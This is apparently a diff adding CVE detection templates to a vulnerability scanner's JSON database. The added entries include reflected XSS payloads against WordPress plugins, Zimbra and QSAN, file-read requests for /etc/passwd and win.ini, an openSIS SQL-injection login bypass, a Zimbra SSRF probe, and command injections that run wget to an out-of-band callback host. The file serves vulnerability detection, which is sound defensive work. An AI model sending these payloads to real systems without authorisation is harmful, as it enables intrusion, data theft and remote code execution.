@@ -3855,6 +3855,47 @@
       ]
     },
     {
+      "id": "CVE-2016-1000153",
+      "info": {
+        "author": "daffainfo",
+        "name": "Tidio Gallery <= 1.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000153",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-1000154",
       "info": {
         "author": "daffainfo",
@@ -3892,6 +3933,47 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/whizz/plugins/delete-plugin.php?plugin=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000155",
+      "info": {
+        "author": "daffainfo",
+        "name": "WPSOLR <= 8.6 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000155",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/templates/template-my-accounts.php?page=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -6926,6 +7008,48 @@
       ]
     },
     {
+      "id": "CVE-2018-14013",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Synacor Zimbra Collaboration Suite Collaboration before 8.8.11 has XSS in the AJAX and html web clients.",
+        "name": "Zimbra XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-14013",
+        "severity": "medium",
+        "tags": "cve,cve2018,xss,zimbra"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/zimbra/h/search?si=1&so=0&sfi=4&st=message&csi=1&action=&cso=0&id=%22%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-14574",
       "info": {
         "author": "pikpikcu",
@@ -7600,6 +7724,40 @@
       ]
     },
     {
+      "id": "CVE-2018-19458",
+      "info": {
+        "author": "daffainfo",
+        "description": "In PHP Proxy 3.0.3, any user can read files from the server without authentication due to an index.php?q=file:/// LFI URI, a different vulnerability than CVE-2018-19246.",
+        "name": "PHP Proxy 3.0.3 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/45780\n- https://www.cvedetails.com/cve/CVE-2018-19458\n",
+        "severity": "high",
+        "tags": "cve,cve2018,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?q=file:///etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-20462",
       "info": {
         "author": "daffainfo",
@@ -7637,6 +7795,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-20470",
+      "info": {
+        "author": "daffainfo",
+        "description": "An issue was discovered in Tyto Sahi Pro through 7.x.x and 8.0.0. A directory traversal (arbitrary file access) vulnerability exists in the web reports module. This allows an outside attacker to view contents of sensitive files.",
+        "name": "Sahi pro 7.x/8.x - Directory Traversal",
+        "reference": "- https://barriersec.com/2019/06/cve-2018-20470-sahi-pro/\n- https://www.cvedetails.com/cve/CVE-2018-20470\n",
+        "severity": "high",
+        "tags": "cve,cve2018,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected"
           ]
         }
       ]
@@ -16452,6 +16648,57 @@
       ]
     },
     {
+      "id": "CVE-2020-6637",
+      "info": {
+        "author": "pikpikcu",
+        "description": "openSIS Community Edition version 7.3 is vulnerable to SQL injection via the USERNAME parameter of index.php.",
+        "name": "OpenSIS v7.3 unauthenticated SQL injection",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2020-6637\n- https://cinzinga.com/CVE-2020-6637/\n",
+        "severity": "high",
+        "tags": "cve,cve2020,sqli,opensis"
+      },
+      "requests": [
+        {
+          "body": "USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "SQL STATEMENT:",
+                "<TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;-- -')</TD>"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/account/index.php",
+            "{{BaseURL}}/opensis/index.php",
+            "{{BaseURL}}/index.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-7209",
       "info": {
         "author": "dwisiswant0",
@@ -16582,6 +16829,33 @@
           "matchers-condition": "and",
           "raw": [
             "GET /PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-7796",
+      "info": {
+        "author": "gy741",
+        "description": "Zimbra Collaboration Suite (ZCS) before 8.8.15 Patch 7 allows SSRF when WebEx zimlet is installed and zimlet JSP is enabled.",
+        "name": "Zimbra Collaboration Suite (ZCS) - SSRF",
+        "reference": "- https://www.adminxe.com/2183.html\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,zimbra,ssrf,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://{{interactsh-url}}%23 HTTP/1.1\nHost: {{Hostname}}\nUser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
           ]
         }
       ]
@@ -20769,6 +21043,33 @@
       ]
     },
     {
+      "id": "CVE-2021-32305",
+      "info": {
+        "author": "gy741",
+        "description": "WebSVN before 2.6.1 allows remote attackers to execute arbitrary commands via shell metacharacters in the search parameter.",
+        "name": "Websvn 2.6.0 - Remote Code Execution (Unauthenticated)",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2021-32305\n- https://packetstormsecurity.com/files/163225/Websvn-2.6.0-Remote-Code-Execution.html\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,websvn,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /search.php?search=%22;wget+http%3A%2F%2F{{interactsh-url}}%27;%22 HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-32820",
       "info": {
         "author": "dhiyaneshDk",
@@ -21258,6 +21559,51 @@
           ],
           "raw": [
             "POST /cgi/networkDiag.cgi HTTP/1.1\nHost: {{Hostname}}\n\ncommand=2&ipAddr=&dnsAddr=$(wget+http://{{interactsh-url}})&interface=0&netType=0&scrFilter=&dstFilter=&fileSave=false&pcapSave=false&fileSize=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-37216",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "QSAN Storage Manager header page parameters does not filter special characters.\nRemote attackers can inject JavaScript without logging in and launch\nreflected XSS attacks to access and modify specific data.\n",
+        "name": "QSAN Storage Manager prior to v3.3.3 Reflected XSS",
+        "reference": "https://www.twcert.org.tw/tw/cp-132-4962-44cd2-1.html",
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,qsan"
+      },
+      "requests": [
+        {
+          "headers": {
+            "X-Trigger-XSS": "<script>alert(1)</script>"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"HTTP_X_TRIGGER_XSS\":\"<script>alert(1)</script>\""
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "dsl": [
+                "!contains(tolower(all_headers), 'x-xss-protection')"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/http_header.php"
           ]
         }
       ]
